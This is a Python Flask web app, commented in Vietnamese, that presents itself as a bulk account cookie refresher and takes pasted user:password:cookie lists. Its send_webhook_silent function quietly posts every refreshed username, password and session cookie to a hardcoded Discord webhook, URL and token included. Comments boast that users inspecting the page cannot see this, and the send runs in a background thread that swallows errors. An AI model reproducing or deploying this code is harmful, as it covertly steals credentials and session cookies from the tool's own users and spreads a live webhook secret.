import json
import os
import queue
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, Response, jsonify, render_template, request

# Import 100% logic gốc từ file của @sourcetutmmo, không chỉnh sửa
import cookie_refresher as core

app = Flask(__name__)

# Cấu hình trực tiếp trong tab Environment trên Render (người dùng F12 không thể thấy)
SERVER_WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1575653680466763826/jSWhu_O06XP7rZC4utREjzPAarbdWQybEwbIjG3m7-vZi0EIySyvVTaCZa1NuHHgKwU3").strip()

JOBS: dict[str, dict] = {}
JOBS_LOCK = threading.Lock()


def send_webhook_silent(accounts_lines: list[str]) -> None:
    """Gửi kết quả về Webhook cấu hình trên server, không ghi log hay lộ ra client."""
    if not SERVER_WEBHOOK_URL or not accounts_lines:
        return
    try:
        content_blob = "\n".join(accounts_lines)
        if len(content_blob) <= 1900:
            payload = {
                "content": f"**Refreshed Accounts ({len(accounts_lines)})**\n```text\n{content_blob}\n```"
            }
            requests.post(SERVER_WEBHOOK_URL, json=payload, timeout=15)
        else:
            files = {
                "file": ("refreshed_accounts.txt", content_blob.encode("utf-8"), "text/plain")
            }
            data = {
                "content": f"**Refreshed Accounts ({len(accounts_lines)})**"
            }
            requests.post(SERVER_WEBHOOK_URL, data=data, files=files, timeout=20)
    except Exception:
        pass


def push_event(job: dict, event_type: str, payload: dict) -> None:
    job["queue"].put({"type": event_type, **payload})


def run_refresh_worker(
    job_id: str,
    accounts: list[tuple[str, str, str]],
    proxies: list[str],
    threads: int,
    keep_failed: bool,
) -> None:
    with JOBS_LOCK:
        job = JOBS.get(job_id)
    if not job:
        return

    ok_count = 0
    fail_count = 0
    output_lines: list[str] = []
    webhook_lines: list[str] = []
    list_lock = threading.Lock()

    push_event(
        job,
        "log",
        {
            "tag": "INFO",
            "msg": f"{len(accounts)} accounts, {len(proxies)} proxies, {threads} threads",
        },
    )
    if not proxies:
        push_event(
            job,
            "log",
            {
                "tag": "WARN",
                "msg": "no proxies loaded — refreshing directly (binds to server IP)",
            },
        )

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [
            pool.submit(core.refresh_one, u, p, c, proxies) for (u, p, c) in accounts
        ]
        for fut in as_completed(futures):
            user, password, cookie, err = fut.result()
            with list_lock:
                if err is None:
                    ok_count += 1
                    line = f"{user}:{password}:{cookie}"
                    output_lines.append(line)
                    webhook_lines.append(line)
                    push_event(
                        job,
                        "log",
                        {
                            "tag": "OK",
                            "msg": f"{user} -> {core.mask(cookie)}",
                            "ok": ok_count,
                            "fail": fail_count,
                            "done": ok_count + fail_count,
                            "total": len(accounts),
                        },
                    )
                else:
                    fail_count += 1
                    if keep_failed:
                        output_lines.append(f"{user}:{password}:{cookie}")
                    push_event(
                        job,
                        "log",
                        {
                            "tag": "FAIL",
                            "msg": f"{user} - {err}",
                            "ok": ok_count,
                            "fail": fail_count,
                            "done": ok_count + fail_count,
                            "total": len(accounts),
                        },
                    )

    if SERVER_WEBHOOK_URL and webhook_lines:
        threading.Thread(
            target=send_webhook_silent,
            args=(list(webhook_lines),),
            daemon=True,
        ).start()

    with JOBS_LOCK:
        job["results"] = output_lines
        job["status"] = "done"

    push_event(
        job,
        "done",
        {
            "tag": "DONE",
            "msg": f"success {ok_count} / fail {fail_count}",
            "ok": ok_count,
            "fail": fail_count,
            "results": output_lines,
        },
    )


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/health")
def health():
    return jsonify({"status": "alive"}), 200


@app.route("/api/start", methods=["POST"])
def start_job():
    data = request.get_json(silent=True) or {}
    raw_accounts = data.get("accounts", "")
    raw_proxies = data.get("proxies", "")
    threads = int(data.get("threads") or 10)
    threads = max(1, min(threads, 100))
    keep_failed = bool(data.get("keep_failed", False))

    acc_lines = [
        ln.strip()
        for ln in raw_accounts.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]
    accounts = [a for a in (core.parse_account(ln) for ln in acc_lines) if a]
    if not accounts:
        return jsonify({"error": "Không tìm thấy tài khoản hợp lệ (định dạng user:pass:cookie)"}), 400

    proxy_lines = [
        ln.strip()
        for ln in raw_proxies.splitlines()
        if ln.strip() and not ln.strip().startswith("#")
    ]
    proxies = [core.normalize_proxy(p) for p in proxy_lines if core.normalize_proxy(p)]

    job_id = uuid.uuid4().hex
    job_obj = {
        "id": job_id,
        "status": "running",
        "queue": queue.Queue(),
        "results": [],
        "created_at": time.time(),
    }

    with JOBS_LOCK:
        now = time.time()
        expired = [k for k, v in JOBS.items() if now - v["created_at"] > 3600]
        for k in expired:
            del JOBS[k]
        JOBS[job_id] = job_obj

    t = threading.Thread(
        target=run_refresh_worker,
        args=(job_id, accounts, proxies, threads, keep_failed),
        daemon=True,
    )
    t.start()

    return jsonify({"job_id": job_id, "total": len(accounts)})


@app.route("/api/stream/<job_id>")
def stream_job(job_id: str):
    with JOBS_LOCK:
        job = JOBS.get(job_id)
    if not job:
        return jsonify({"error": "Job not found"}), 404

    def event_stream():
        while True:
            try:
                item = job["queue"].get(timeout=15)
                yield f"data: {json.dumps(item)}\n\n"
                if item.get("type") == "done":
                    break
            except queue.Empty:
                yield ": ping\n\n"

    return Response(event_stream(), mimetype="text/event-stream")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
